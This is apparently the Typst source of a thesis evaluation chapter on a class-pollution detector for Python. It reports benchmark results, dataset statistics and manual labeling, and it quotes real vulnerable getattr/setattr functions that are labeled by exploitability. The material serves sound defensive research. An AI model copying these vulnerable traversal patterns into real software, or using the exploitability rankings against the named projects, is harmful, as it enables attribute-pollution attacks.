// data analysis
#import "../utils/global-imports.typ": codly, cve, gh, gls-shrt, headcount, lq, pep, subpar
#import "../utils/constants.typ": TheTool, gh_color, pypi_color, tbl_green, tbl_grey, tbl_red

#let raw_data = json("../assets/summary.json")
#let data_filtered = raw_data.map(project => {
  let cloned = project + (:)
  cloned.insert("issues", cloned.at("issues", default: ()).filter(issue => issue.at("getattr_count") != "One"))
  cloned
})

#let filter_list(list, predicate, inv: false) = {
  if inv {
    list.filter((..args) => not predicate(..args))
  } else {
    list.filter(predicate)
  }
}

#let by_platform(platform) = {
  project => project.at("platform") == platform
}
#let by_has_issues(project) = {
  project.at("issues").len() > 0
}
#let by_is_vulnerable(project) = {
  project.at("issues").any(issue => issue.at("label").at("kind") == "Vulnerable")
}
#let by_is_issue_vulnerable(issue) = {
  issue.at("label").at("kind") == "Vulnerable"
}
#let by_has_features(features) = {
  issue => {
    let feats = issue.at("label").at("features")
    features.all(f => feats.find(f2 => f2.at("kind") == f) != none)
  }
}
#let by_has_error(project) = {
  project.at("error_stage") != none
}

#let median(list) = {
  let sortedList = list.sorted()
  let len = sortedList.len()
  if calc.rem(len, 2) == 0 {
    let middle = calc.quo(len, 2)
    (sortedList.at(middle - 1) + sortedList.at(middle)) / 2
  } else {
    let middle = calc.quo(len, 2)
    sortedList.at(middle)
  }
}

#let calc_list_stats(list) = {
  let min = calc.min(..list)
  let max = calc.max(..list)
  let median = median(list)
  (
    list: list,
    min: min,
    max: max,
    median: median,
  )
}

#let calc_popularity(list) = {
  let popularity = list.map(project => project.at("popularity"))
  calc_list_stats(popularity)
}

#let calc_elapsed_seconds(list) = {
  let elapsed_seconds = list.map(project => project.at("elapsed_seconds"))
  calc_list_stats(elapsed_seconds)
}

#let calc_error_reason_dist(list) = {
  list.fold((:), (acc, project) => {
    let stage = project.at("error_stage")
    let reason = if stage == "Setup" {
      "DownloadTimeout"
    } else if stage == "Analysis" {
      if project.at("elapsed_seconds") >= 1800 {
        // 30 minutes
        "AnalysisTimeout"
      } else {
        "AnalysisError"
      }
    } else {
      "Other"
    }
    acc.insert(reason, acc.at(reason, default: 0) + 1)
    acc
  })
}

#let extract_issues(list) = {
  list.map(project => project.at("issues")).flatten()
}
#let extract_features(issues) = {
  issues.fold((:), (acc, issue) => {
    let features = issue.at("label").at("features")
    for feature in features {
      let feature = feature.at("kind")
      acc.insert(feature, acc.at(feature, default: 0) + 1)
    }
    acc
  })
}
#let extract_reasons(issues) = {
  issues.fold((:), (acc, issue) => {
    let reasons = issue.at("label").at("reasons")
    for reason in reasons {
      let reason = reason.at("kind")
      acc.insert(reason, acc.at(reason, default: 0) + 1)
    }
    acc
  })
}

#let all_pypi_projects = filter_list(data_filtered, by_platform("PyPI"))
#let all_gh_projects = filter_list(data_filtered, by_platform("GitHub"))

#let projects_error = filter_list(data_filtered, by_has_error)
#let pypi_projects_error = filter_list(projects_error, by_platform("PyPI"))
#let gh_projects_error = filter_list(projects_error, by_platform("GitHub"))
#let error_reason_dist = calc_error_reason_dist(projects_error)
#let pypi_error_reason_dist = calc_error_reason_dist(pypi_projects_error)
#let gh_error_reason_dist = calc_error_reason_dist(gh_projects_error)

#let projects_success = filter_list(data_filtered, by_has_error, inv: true)
#let pypi_projects = filter_list(projects_success, by_platform("PyPI"))
#let gh_projects = filter_list(projects_success, by_platform("GitHub"))

#let pypi_popularity = calc_popularity(all_pypi_projects)
#let gh_popularity = calc_popularity(all_gh_projects)
#let projects_elapsed_seconds = calc_elapsed_seconds(projects_success)
#let pypi_elapsed_seconds = calc_elapsed_seconds(pypi_projects)
#let gh_elapsed_seconds = calc_elapsed_seconds(gh_projects)

#let total_runtime_seconds = data_filtered.map(project => project.at("elapsed_seconds")).sum()
#let success_runtime_seconds = projects_success.map(project => project.at("elapsed_seconds")).sum()

#let has_issues_pypi_projects = filter_list(pypi_projects, by_has_issues)
#let has_issues_gh_projects = filter_list(gh_projects, by_has_issues)
#let has_issues_projects = filter_list(projects_success, by_has_issues)
#let no_issues_pypi_projects = filter_list(pypi_projects, by_has_issues, inv: true)
#let no_issues_gh_projects = filter_list(gh_projects, by_has_issues, inv: true)
#let no_issues_projects = filter_list(projects_success, by_has_issues, inv: true)

#let vulnerable_pypi_projects = filter_list(has_issues_pypi_projects, by_is_vulnerable)
#let vulnerable_gh_projects = filter_list(has_issues_gh_projects, by_is_vulnerable)
#let vulnerable_projects = filter_list(has_issues_projects, by_is_vulnerable)
#let not_vulnerable_pypi_projects = filter_list(has_issues_pypi_projects, by_is_vulnerable, inv: true)
#let not_vulnerable_gh_projects = filter_list(has_issues_gh_projects, by_is_vulnerable, inv: true)
#let not_vulnerable_projects = filter_list(has_issues_projects, by_is_vulnerable, inv: true)

#let pyre_issue_count = projects_success.map(project => project.at("raw_issue_count")).sum()
#let all_issues = extract_issues(projects_success)
#let pypi_issues = extract_issues(pypi_projects)
#let gh_issues = extract_issues(gh_projects)

#let vulnerable_issues = filter_list(all_issues, by_is_issue_vulnerable)
#let vulnerable_pypi_issues = filter_list(pypi_issues, by_is_issue_vulnerable)
#let vulnerable_gh_issues = filter_list(gh_issues, by_is_issue_vulnerable)
#let not_vulnerable_issues = filter_list(all_issues, by_is_issue_vulnerable, inv: true)
#let not_vulnerable_pypi_issues = filter_list(pypi_issues, by_is_issue_vulnerable, inv: true)
#let not_vulnerable_gh_issues = filter_list(gh_issues, by_is_issue_vulnerable, inv: true)

#let vulnerable_issues_features = extract_features(vulnerable_issues)
#let vulnerable_pypi_issues_features = extract_features(vulnerable_pypi_issues)
#let vulnerable_gh_issues_features = extract_features(vulnerable_gh_issues)
#let not_vulnerable_issues_reasons = extract_reasons(not_vulnerable_issues)
#let not_vulnerable_pypi_issues_reasons = extract_reasons(not_vulnerable_pypi_issues)
#let not_vulnerable_gh_issues_reasons = extract_reasons(not_vulnerable_gh_issues)

#let case_study_considered = vulnerable_projects.filter(p => p
  .at("issues")
  .any(issue => (
    issue.at("label").at("kind") == "Vulnerable"
      and issue.at("label").at("features").any(f => f.at("kind") == "DictAccess")
      and issue.at("label").at("features").any(f => f.at("kind") == "SupportsSetItem")
  )))


// text
= Evaluation <results>

As part of @rq-tool-design[] and @rq-widespread[], this degree project aims
to evaluate the performance of #TheTool in regards to its accuracy at
detecting class pollution.
#TheTool is first tested against a small set of handcrafted benchmarks,
as per @results:micro-benchmarks, and then executed on dataset
consisting of popular @pypi and GitHub packages, as described in @results:analysis.

Then, in @results:case-study, a case study is performed on a popular
library that is vulnerable to class pollution, enabling @rce on a
real-world application.

Additionally,
it was previously mentioned in @method:tool-design that there were certain
design decisions that needed to be taken.
The results in @results:micro-benchmarks and @results:analysis reflect
the final version of the tool, where no dependencies were installed,
a single source and sink were defined,
and only the taint features mentioned in @thing:cli were taken into
account during post processing, including `via:customgetattr`.
The results for each variant of the design,
along with some reasoning on why they were or were not implemented,
is outlined in @results:tweaks.

== Micro Benchmarking <results:micro-benchmarks>

As there is no public dataset of projects vulnerable to class pollution,
evaluation has to be predominantly done manually.
For that reason, a small collection of both known-vulnerable and
known-not-vulnerable Python programs was created
to assess the basic functionality of #TheTool.

In this small collection of synthetic benchmarks,
there are 3 known-vulnerable programs,
as well as 2 known-not-vulnerable programs,
which cover basic scenarios where class pollution
may occur.
Namely, the former programs test if the #TheTool is able to detect
the flow from chained `getattr` calls to a `setattr` call,
or even through many function calls,
while the latter programs check for common pitfalls such as
only having a single call to `getattr`
or having hardcoded names for the attributes in calls to `getattr`.
The source code for these tests can be found in the `detection-benchmarks`
directory of the accompanying repository.

As shown in @tbl:results-micro-benchmark,
#TheTool has been ran on all 5 of these tests,
and successfully passed 4 of them,
having failed to properly identify when the attribute
passed to `getattr` is a static string.
The relevant code of the failing test can be seen in @code:test-static-attr.

#figure(
  caption: [Failing test, where #TheTool fails to detect a static string in the attribute parameter of `getattr`],
  [
    #set text(size: 9pt)
    #codly.codly(
      header: box(height: 6pt)[`detection-benchmarks/negative/001-static-strings-to-getattr-setattr/main.py`],
      offset: 11,
      highlighted-lines: (13,),
    )
    ```py
    foo = getattr(a, text1)
    bar = getattr(foo, "FOOBAR")
    setattr(bar, text2, text3)
    ```
  ],
) <code:test-static-attr>

#figure(caption: [Confusion matrix for each test in the artificial benchmark])[
  #show table.cell.where(x: 0): strong
  #show table.cell.where(y: 0): strong

  #table(
    columns: 4,
    stroke: none,
    align: center + horizon,
    fill: (x, y) => {
      if (x, y) == (3, 3) or (x, y) == (2, 2) {
        tbl_green
      } else if (x, y) == (2, 3) or (x, y) == (3, 2) {
        tbl_red
      }
    },
    table.vline(x: 2),
    [], [], table.cell(colspan: 2)[Ground Truth],
    [], [], [Positive], [Negative],
    table.hline(),
    table.cell(rowspan: 2)[Results], [Positive], [3], [1],
    [Negative], [0], [1],
  )
] <tbl:results-micro-benchmark>

In addition to the artificial benchmarks,
#TheTool has also been tested against 5 projects known to be or
have been vulnerable,
listed in @tbl:vuln-projects.

#figure(caption: [List of open-source projects known-vulnerable to class pollution])[
  #show table.cell.where(y: 0): strong

  #table(
    columns: 4,
    table.header([GitHub Repository], [Vulnerable Version], [Advisory], [Fixed Version]),
    gh("nortikin/sverchok"), [1.3.0], cve("CVE-2025-3982"), [_none_],
    gh("adamghill/django-unicorn"), [0.61.0], cve("CVE-2025-24370"), [0.62.0],
    gh("mesop-dev/mesop"), [0.14.0], cve("CVE-2025-30358"), [0.14.1],
    gh("comfyanonymous/ConfyUI"),
    [0.3.40],
    [_none_#footnote(link("https://github.com/comfyanonymous/ComfyUI/pull/8435"))],
    [0.3.41],

    gh("dgilland/pydash"), [5.1.2], cve("CVE-2023-26145"), [6.0.0],
  )
] <tbl:vuln-projects>

#let raw_data_vulnerable = json("../assets/summary-vulnerable.json")
#let all_vuln_issues = extract_issues(raw_data_vulnerable).filter(issue => issue.at("getattr_count") != "One")
#let issues_tp = filter_list(all_vuln_issues, by_is_issue_vulnerable)
#let issues_fp = filter_list(all_vuln_issues, by_is_issue_vulnerable, inv: true)

#TheTool successfully identified the vulnerabilities in all of the projects,
without raising any false positives.
For two of the projects, however,
it raised more than a single issue for the vulnerable code due to
the presence of multiple sinks,
but this is expected behaviour.
The confusion matrix for these results can be seen in @tbl:results-vulnerable-pkgs,
noting that there is no number of true negatives since that would be
considered all the remaining code in the codebase.

#figure(caption: [Confusion matrix for the issues raised by #TheTool in
  known-vulnerable projects])[
  #show table.cell.where(x: 0): strong
  #show table.cell.where(y: 0): strong

  #table(
    columns: 4,
    stroke: none,
    align: center + horizon,
    fill: (x, y) => {
      if (x, y) == (2, 2) {
        tbl_green
      } else if (x, y) == (2, 3) or (x, y) == (3, 2) {
        tbl_red
      } else if (x, y) == (3, 3) {
        tbl_grey
      }
    },
    table.vline(x: 2),
    [], [], table.cell(colspan: 2)[Ground Truth],
    [], [], [Positive], [Negative],
    table.hline(),
    table.cell(rowspan: 2)[Results], [Positive], [#issues_tp.len()], [#issues_fp.len()],
    [Negative], [0], [-],
  )
] <tbl:results-vulnerable-pkgs>

== Empirical Study <results:analysis>

To validate the accuracy of #TheTool in real-world scenarios,
it has been tested against a large dataset of open-source Python projects.
The composition of this dataset is outlined in @results:dataset,
and the results of this empirical study are presented in @results:analysis-results.

=== Dataset <results:dataset>

#let gh_total_count = 8822
#let gh_date = datetime(year: 2025, month: 7, day: 16)
#let pypi_total_count = 15000
#let pypi_excluded_count = 6
#let pypi_dataset_date = datetime(year: 2025, month: 8, day: 1)
#let pypi_version_date = datetime(year: 2025, month: 8, day: 14)

#let format_popularity(n) = {
  if n >= 1000000000 {
    [#calc.quo(n, 1000000000)B]
  } else if n >= 1000000 {
    [#calc.quo(n, 1000000)M]
  } else if n >= 1000 {
    [#calc.quo(n, 1000)k]
  } else {
    str(n)
  }
}

As mentioned in @method:data-collection, the tool has been run on a set of
@pypi and GitHub projects, for a total of #raw_data.len() projects.

The public @pypi dataset used contained a total of
#pypi_total_count entries, as of #pypi_dataset_date.display().
Some packages were so old they did not provide any wheels nor source tarballs,
but instead only provided the legacy eggs format
#footnote(link("https://packaging.python.org/en/latest/discussions/package-formats/#egg-format")).
Other packages had been deleted, did not follow conventional filename formats
(#pep(625)),
or some of their files were missing from the latest version.
The #pypi_excluded_count packages where that was the case were ignored for simplicity,
resulting in #(pypi_total_count - pypi_excluded_count) valid entries.
Then, #all_pypi_projects.len() packages were sampled according to the method described in
@method:data-collection, and a link to their latest wheel or source tarball was
saved on #pypi_version_date.display().

On the other hand, as of #gh_date.display(), there were only #gh_total_count Python
repositories with more than 1000 stars on GitHub.
Similarly, of the #gh_total_count repositories, #all_gh_projects.len()
were sampled as previously described, and their latest revision
information was fetched on the same date.


#let popularity-tick-formatter(ticks, ..) = {
  ticks.map(format_popularity)
}
#figure(
  caption: [
    Popularity (downloads for @pypi, stars for GitHub) distribution for the
    projects in the dataset
  ],
  [
    #lq.diagram(
      width: 11cm,
      height: 2.5cm,
      yaxis: (ticks: (block(width: 1.4cm)[@pypi],).enumerate()),
      xaxis: (position: top, mirror: true, format-ticks: popularity-tick-formatter),
      xscale: "log",
      xlabel: [Downloads],
      lq.hboxplot(stroke: pypi_color, y: 0, pypi_popularity.list),
    )

    #lq.diagram(
      width: 11cm,
      height: 2.5cm,
      yaxis: (ticks: (block(width: 1.4cm)[GitHub],).enumerate()),
      xaxis: (format-ticks: popularity-tick-formatter),
      xscale: "log",
      xlabel: [Stars],
      lq.hboxplot(stroke: gh_color, y: 0, gh_popularity.list),
    )
  ],
) <fg:popularity-distribution>

Due to the sampling method used, the final dataset contains a wide range of packages
when it comes to their popularity.
For @pypi packages, the download count ranges from #format_popularity(pypi_popularity.min)
to #format_popularity(pypi_popularity.max) downloads, with a median of
#format_popularity(pypi_popularity.median) downloads.
For GitHub packages, the star count ranges from #format_popularity(gh_popularity.min)
to #format_popularity(gh_popularity.max) stars, with a median of
#format_popularity(gh_popularity.median) stars.
The distribution for each platform can be visualised on @fg:popularity-distribution.

Additionally, it is worth nothing that none of the vulnerable projects
tested in the micro benchmarks from @results:micro-benchmarks
is present in final the dataset.

=== Results <results:analysis-results>

#let format_time(seconds) = {
  [#calc.round(seconds / (60 * 60), digits: 1) hours]
}

#let manual_categorisation_time_seconds = 39809 // from timewarrior

Analysing the projects in the dataset using #TheTool took a total of
#format_time(total_runtime_seconds) of runtime, and an additional
#format_time(manual_categorisation_time_seconds) of manual labeling work
by a single person. However, the runtime duration is skewed by a few
projects that triggered a bug in Pysa and got stuck in a loop, being killed
after a 30 minute timeout.
Ignoring the analysis of failed projects, the total runtime excluding manual work is
just #format_time(success_runtime_seconds).
Taking into account only successfully analysed projects, the automated analysis
time for each individual project ranged
between #projects_elapsed_seconds.min seconds and
#calc.round(projects_elapsed_seconds.max / 60, digits: 1) minutes,
with a median value of just #projects_elapsed_seconds.median seconds,
and can be visualised in @fg:elapsed-seconds-distribution.
During analysis, #TheTool has been run exclusively on a shared machine with an
AMD EPYC 7742 64-core processor and 512GB of memory, although limited to
using only 32 cores.

#figure(
  caption: [Analysis time distribution for the #projects_success.len()
    projects that were successfully analysed],
  [
    #lq.diagram(
      width: 11cm,
      height: 4cm,
      yaxis: (ticks: ([GitHub], [@pypi]).enumerate(), subticks: none),
      xaxis: (exponent: none),
      xscale: "log",
      xlabel: [Analysis time (seconds)],
      lq.hboxplot(stroke: pypi_color, y: 1, pypi_elapsed_seconds.list),
      lq.hboxplot(stroke: gh_color, y: 0, gh_elapsed_seconds.list),
    )
  ],
) <fg:elapsed-seconds-distribution>

Unfortunately, #projects_error.len() projects failed to be analysed,
mostly due to the aforementioned bug in Pysa,
and, as such, these projects were excluded from the remaining results below.
@tbl:error-reason shows how many projects failed and why,
discriminated by platform.

#assert.eq(error_reason_dist.len(), 3, message: "missing error reason in table")
#figure(caption: [Number of projects that failed being analysed for a given reason,
  by platform])[
  #show table.cell.where(x: 0): strong
  #show table.cell.where(y: 0): strong

  #table(
    columns: 4,
    stroke: (x, y) => if y == 0 {
      (bottom: 0.7pt + black)
    },
    align: (x, y) => (
      if x > 0 { center } else { right }
    ),
    table.vline(x: 1, start: 0),
    table.vline(x: 3, start: 0, stroke: stroke(dash: "dashed")),
    table.header([Reason], [@pypi], [GitHub], [Total]),
    [Download Timed Out],
    [#pypi_error_reason_dist.at("DownloadTimeout", default: 0)],
    [#gh_error_reason_dist.at("DownloadTimeout", default: 0)],
    [#error_reason_dist.at("DownloadTimeout")],

    [Pysa Error],
    [#pypi_error_reason_dist.at("AnalysisError", default: 0)],
    [#gh_error_reason_dist.at("AnalysisError", default: 0)],
    [#error_reason_dist.at("AnalysisError")],

    [Pysa Timeout],
    [#pypi_error_reason_dist.at("AnalysisTimeout", default: 0)],
    [#gh_error_reason_dist.at("AnalysisTimeout", default: 0)],
    [#error_reason_dist.at("AnalysisTimeout")],

    table.hline(start: 0, stroke: stroke(dash: "dashed")),
    [Total], [#pypi_projects_error.len()], [#gh_projects_error.len()], [#projects_error.len()],
  )
] <tbl:error-reason>

#let type_i_error_rate = calc.round((not_vulnerable_projects.len() / has_issues_projects.len()) * 100, digits: 1)

Out of the #projects_success.len() projects successfully analysed,
a total of #no_issues_projects.len()
(#calc.round((no_issues_projects.len() / projects_success.len()) * 100, digits: 1)%)
did not have any issues found by #TheTool.
Furthermore, amongst the remaining #has_issues_projects.len() projects with issues,
only #vulnerable_projects.len() have at least one issue that was deemed vulnerable.
As can be seen by @fg:projects-issue, the amount of vulnerable projects varies
slightly by platform, with only #vulnerable_pypi_projects.len() @pypi projects
being vulnerable in contrast with #vulnerable_gh_projects.len() GitHub projects.
From a projects perspective, this means there is a Type-I error rate of
#type_i_error_rate%.

#figure(
  caption: [Visualisation of how many projects have been found to possibly
    contain a class pollution vulnerability, discriminated by platform.],
)[
  #let x_pypi = range(3)
  #let y_pypi = (
    vulnerable_pypi_projects.len(),
    not_vulnerable_pypi_projects.len(),
    no_issues_pypi_projects.len(),
  )
  #let x_gh = range(3)
  #let y_gh = (
    vulnerable_gh_projects.len(),
    not_vulnerable_gh_projects.len(),
    no_issues_gh_projects.len(),
  )

  #lq.diagram(
    width: 10cm,
    height: 7cm,
    legend: (position: left + top),
    ylabel: [Number of Projects],
    margin: (top: 10%),
    xaxis: (
      ticks: ("Vulnerable", "Only False Positives", "No Issues").enumerate(),
      subticks: none,
    ),
    yaxis: (exponent: none),

    lq.bar(
      x_pypi,
      y_pypi,
      offset: -0.2,
      width: 0.4,
      fill: pypi_color,
      label: [@pypi],
    ),
    lq.bar(
      x_gh,
      y_gh,
      offset: 0.2,
      width: 0.4,
      fill: gh_color,
      label: [GitHub],
    ),

    ..x_pypi
      .zip(y_pypi)
      .map(((x, y)) => {
        lq.place(x - 0.2, y, pad(0.2em, [#y]), align: bottom)
      }),
    ..x_gh
      .zip(y_gh)
      .map(((x, y)) => {
        lq.place(x + 0.2, y, pad(0.2em, [#y]), align: bottom)
      }),
  )
] <fg:projects-issue>

Across all projects, there were a total of #all_issues.len() issues reported by
#TheTool, which filtered out most of the #pyre_issue_count issues directly reported
by Pysa.
These #all_issues.len() issues were then manually labeled into _Vulnerable_ or
_Not Vulnerable_, along with a feature list for the former and a reason list
for the latter.
Only #vulnerable_issues.len() issues have been labeled as _Vulnerable_,
resulting in a Type-I error of
#calc.round((not_vulnerable_issues.len() / all_issues.len()) * 100, digits: 1)%,
from an issues perspective.
However, it is important to highlight that, in some of the projects, there were
many issues for the same or similar source/sink combinations, which inflates the
number of issues, particularly when it comes for false positives.
No grouping was applied when the source/sink was the same, since the code path
between the two was usually different, which sometimes resulted in different
labeling.
The overall label classification, discriminated by platform, can be visualised in
@fg:issue-label.

#figure(
  caption: [Visualisation of the overall label of each issue,
    discriminated by platform of the respective project.],
)[
  #let x_pypi = range(2)
  #let y_pypi = (
    vulnerable_pypi_issues.len(),
    not_vulnerable_pypi_issues.len(),
  )
  #let x_gh = range(2)
  #let y_gh = (
    vulnerable_gh_issues.len(),
    not_vulnerable_gh_issues.len(),
  )

  #lq.diagram(
    width: 10cm,
    height: 6cm,
    legend: (position: left + top),
    ylabel: [Number of Issues],
    margin: (top: 10%),
    xaxis: (
      ticks: ("Vulnerable", "Not Vulnerable (False Positive)").enumerate(),
      subticks: none,
    ),
    yaxis: (exponent: none),

    lq.bar(
      x_pypi,
      y_pypi,
      offset: -0.2,
      width: 0.4,
      fill: pypi_color,
      label: [@pypi],
    ),
    lq.bar(
      x_gh,
      y_gh,
      offset: 0.2,
      width: 0.4,
      fill: gh_color,
      label: [GitHub],
    ),

    ..x_pypi
      .zip(y_pypi)
      .map(((x, y)) => {
        lq.place(x - 0.2, y, pad(0.2em, [#y]), align: bottom)
      }),
    ..x_gh
      .zip(y_gh)
      .map(((x, y)) => {
        lq.place(x + 0.2, y, pad(0.2em, [#y]), align: bottom)
      }),
  )
] <fg:issue-label>

As mentioned, each vulnerable issue has additionally been labeled with
a feature list, which helps to rank them regarding exploitability.
Four of the features are deemed positive, that is, they increase the likelihood
of an issue being exploitable, while three of them are deemed negative.
All vulnerable issues were assumed to have `getattr` access and `setattr` support,
since that is what the taint models in use by #TheTool were looking for,
and therefore those were not included as features.
The feature distribution can be visualised on @fg:vuln-issue-features, keeping in mind
that an issue can have zero or more features.
Additionally, example code for each feature, taken from the obtained results,
can be seen in @code:vulnerable-labels.

Across both platforms, only #vulnerable_issues_features.at("DictAccess") issues
have _Dict Access_, that is, they allow traversing through the entries of a
dictionary using `__getitem__`.
Surprisingly, #vulnerable_issues_features.at("ListTupleAccess") issues have
_List/Tuple Access_, which is really similar to _Dict Access_, but for
numeric keys only.
It is worth noting that this feature is not a superset of _Dict Access_, since
it requires the key to be of type `int`, meaning the vulnerable code must perform
the appropriate conversion.
Furthermore, just #vulnerable_issues_features.at("SupportsSetItem") issues
have the _Supports `__setitem__`_ feature,
that is, it is possible to change the value of a dictionary,
list or tuple.
Notably, #filter_list(vulnerable_issues, by_has_features(("DictAccess", "SupportsSetItem"))).len()
of these issues also have the _Dict Access_ feature, which is one of
the best combinations when it comes to exploitability.
#assert.eq(
  vulnerable_issues_features.at("AdditionalBenefits"),
  1,
  message: "AdditionalBenefits is not 1 anymore",
)
Finally, a single issue has _Additional Benefits_, because it starts by traversing
the globals of the current context, instead of on a local object.
Unfortunately, the respective code is only used in a testing context with static
paths, and is therefore not exploitable.

On the other hand, when it comes to the negative features,
#vulnerable_issues_features.at("NeedsExisting") issues have been labeled with
_Needs Existing_, as they cannot set a new attribute or dictionary item,
usually due to some kind of check.
This feature does not account for checks during traversal, as most of the
code just crashes if part of the traversal path does not exist, and because
it is not very relevant exploitability-wise.
Moreover, #vulnerable_issues_features.at("ValueNotControlled") issues have
been labeled with _Value Not Controlled_, as the value being set is not
controlled by an attacker (e.g., it is hardcoded to a specific value),
despite the path still being controllable.
Finally, #vulnerable_issues_features.at("AdditionalConstraints") have
_Additional Constraints_ that prevents them from being exploitable, such
as requiring certain fields to exist in the target object, or that the
target object extend a certain class.

#figure(
  caption: [Visualisation of the features of the issues deemed vulnerable,
    discriminated by platform of the respective project.],
)[
  #let all_features = (
    "AdditionalConstraints": [Additional Constraints],
    "ValueNotControlled": [Value Not Controlled],
    "NeedsExisting": [Needs Existing],
    "AdditionalBenefits": [Additional Benefits],
    "SupportsSetItem": [Supports `__setitem__`],
    "ListTupleAccess": [List/Tuple Access],
    "DictAccess": [Dict Access],
  )
  #let x_pypi = all_features.keys().map(feat => vulnerable_pypi_issues_features.at(feat, default: 0))
  #let y_pypi = range(all_features.len())
  #let x_gh = all_features.keys().map(feat => vulnerable_gh_issues_features.at(feat, default: 0))
  #let y_gh = range(all_features.len())

  #lq.diagram(
    width: 10cm,
    height: 7cm,
    legend: (position: right + horizon, dy: -1em),
    margin: (right: 10%),
    xlabel: [Number of Issues],
    xaxis: (exponent: none),
    yaxis: (
      ticks: all_features.values().enumerate(),
      subticks: none,
    ),

    lq.hbar(
      x_pypi,
      y_pypi,
      offset: -0.2,
      width: 0.4,
      fill: pypi_color,
      label: [@pypi],
    ),
    lq.hbar(
      x_gh,
      y_gh,
      offset: 0.2,
      width: 0.4,
      fill: gh_color,
      label: [GitHub],
    ),

    ..x_pypi
      .zip(y_pypi)
      .map(((x, y)) => {
        lq.place(x, y - 0.2, pad(0.2em, [#x]), align: left)
      }),
    ..x_gh
      .zip(y_gh)
      .map(((x, y)) => {
        lq.place(x, y + 0.2, pad(0.2em, [#x]), align: left)
      }),
  )
] <fg:vuln-issue-features>

#show <code:vulnerable-labels>: set block(breakable: true)
#subpar.super(
  grid(
    columns: (1fr,),
    rows: (auto, auto),
    gutter: 1em,
    figure(
      caption: [Vulnerable code that has been labeled with features
        _Dict Access_, _List/Tuple Access_, and _Supports `__setitem__`_],
      [
        #set text(size: 9pt)
        #codly.codly(
          skips: ((2, 12),),
          header: box(height: 6pt)[`vendor/keypath.py`],
          footer: [from @pypi package *pyinstrument* at version 5.1.1],
          offset: 61,
          highlights: (
            (line: 78, start: 13, end: none, fill: yellow, tag: [_Dict Access_]),
            (line: 80, start: 13, end: none, fill: blue, tag: [_List/Tuple Access_]),
            (line: 85, start: 5, end: none, fill: green, tag: [_Supports `__setitem__`_]),
            (line: 87, start: 5, end: none, fill: green, tag: [_Supports `__setitem__`_]),
          ),
        )
        ```py
        def set_value_at_keypath(obj: Any, keypath: str, val: Any):
          parts = keypath.split('.')
          for part in parts[:-1]:
            if isinstance(obj, dict):
              obj = obj[part]
            elif type(obj) in [tuple, list]:
              obj = obj[int(part)]
            else:
              obj = getattr(obj, part)
          last_part = parts[-1]
          if isinstance(obj, dict):
            obj[last_part] = val
          elif type(obj) in [tuple, list]:
            obj[int(last_part)] = val
          else:
            setattr(obj, last_part, val)
          return True
        ```
      ],
    ),
    figure(
      caption: [Vulnerable code that has been labeled with
        feature _Additional Benefits_ because it starts traversing at globals],
      [
        #set text(size: 9pt)
        #codly.codly(
          skips: ((2, 13),),
          header: box(height: 6pt)[`examples/bespoke-stratos-data-generation/util/testing/pyext2.py`],
          footer: [from GitHub repository *bespokelabsai/curator* at revision 3ee1710],
          offset: 512,
          highlights: (
            (line: 527, start: 3, end: none, fill: purple, tag: [_Additional Benefits_]),
          ),
        )
        ```py
        def assign(varname, value):
          fd = inspect.stack()[1][0].f_globals
          if "." not in varname:
              fd[varname] = value
          else:
              vsplit = list(map(str.strip, varname.split(".")))
              if vsplit[0] not in fd:
                  raise NameError("Unknown object: %s" % vsplit[0])
              base = fd[vsplit[0]]
              for x in vsplit[1:-1]:
                  base = getattr(base, x)
              setattr(base, vsplit[-1], value)
          return value
        ```
      ],
    ),
    figure(
      caption: [Vulnerable code that has been labeled with
        features _Needs Existing_ and _Value Not Controlled_],
      [
        #set text(size: 9pt)
        #codly.codly(
          skips: ((2, 23), (3, 9), (4, 65), (6, 3), (19, 17)),
          header: box(height: 6pt)[`apex/apex/reparameterization/reparameterization.py`],
          footer: [from GitHub repository *openai/jukebox* at revision 08efbbc],
          offset: 3,
          highlights: (
            (line: 142, start: 14, end: none, fill: orange, tag: [_Needs Existing_]),
            (line: 144, start: 43, end: 83, fill: maroon, tag: [_Value Not Controlled_]),
          ),
        )
        ```py
        class Reparameterization(object):
            def compute_weight(self, module=None, name=None):
                raise NotImplementedError
            @staticmethod
            def get_module_and_name(module, name):
                name2use = None
                module2use = None
                names = name.split('.')
                if len(names) == 1 and names[0] != '':
                    name2use = names[0]
                    module2use = module
                elif len(names) > 1:
                    module2use = module
                    name2use = names[0]
                    for i in range(len(names)-1):
                        module2use = getattr(module2use, name2use)
                        name2use = names[i+1]
                return module2use, name2use
            def __call__(self, module, inputs):
                """callable hook for forward pass"""
                module2use, name2use = Reparameterization.get_module_and_name(module, self.name)
                _w = getattr(module2use, name2use)
                if not self.evaluated or _w is None:
                    setattr(module2use, name2use, self.compute_weight(module2use, name2use))
                    self.evaluated = True
        ```
      ],
    ),
    figure(
      caption: [Vulnerable code that has been labeled with
        features _Needs Existing_ and _Additional Constraints_],
      [
        #set text(size: 9pt)
        #codly.codly(
          skips: ((2, 142),),
          header: box(height: 6pt)[`paddleformers/peft/vera/vera_model.py`],
          footer: [from GitHub repository *PaddlePaddle/PaddleFormers* at revision 1e7befa],
          offset: 32,
          highlights: (
            (line: 181, start: 18, end: none, fill: orange, tag: [_Needs Existing_]),
            (line: 182, start: 55, end: 70, fill: red),
            (line: 183, start: 60, end: 81, fill: red),
            (line: 183, start: 97, end: 118, fill: red),
            (line: 184, start: 34, end: none, fill: red),
            (line: 186, start: 36, end: none, fill: red, tag: [_Additional Constraints_]),
          ),
        )
        ```py
        class VeRAModel(nn.Layer):
            def _find_and_restore_module(self, module_name):
                parent_module = self.model
                attribute_chain = module_name.split(".")
                for name in attribute_chain[:-1]:
                    parent_module = getattr(parent_module, name)
                module = getattr(parent_module, attribute_chain[-1])
                original_model_class = self.restore_layer_map[module.__class__]
                original_module = original_model_class(in_features=module.weight.shape[0], out_features=module.weight.shape[1])
                original_module.weight = module.weight
                if module.bias is not None:
                    original_module.bias = module.bias
                setattr(parent_module, attribute_chain[-1], original_module)
        ```
      ],
    ),
    figure(
      caption: [Vulnerable code that has not been labeled with any features],
      [
        #set text(size: 9pt)
        #codly.codly(
          header: box(height: 6pt)[`pytorch_lightning/utilities/parameter_tying.py`],
          footer: [from @pypi package *pytorch-lightning* at version 2.5.3],
          offset: 63,
        )
        ```py
        def _set_module_by_path(module: nn.Module, path: str, value: nn.Module) -> None:
            path = path.split(".")
            for name in path[:-1]:
                module = getattr(module, name)
            setattr(module, path[-1], value)
        ```
      ],
    ),
  ),
  // subpar resets the chapter-dependent numbering, so set it again
  numbering: headcount.dependent-numbering("1.1"),
  caption: [Real-world examples of vulnerable functions and
    the feature labels applied to them],
  label: <code:vulnerable-labels>,
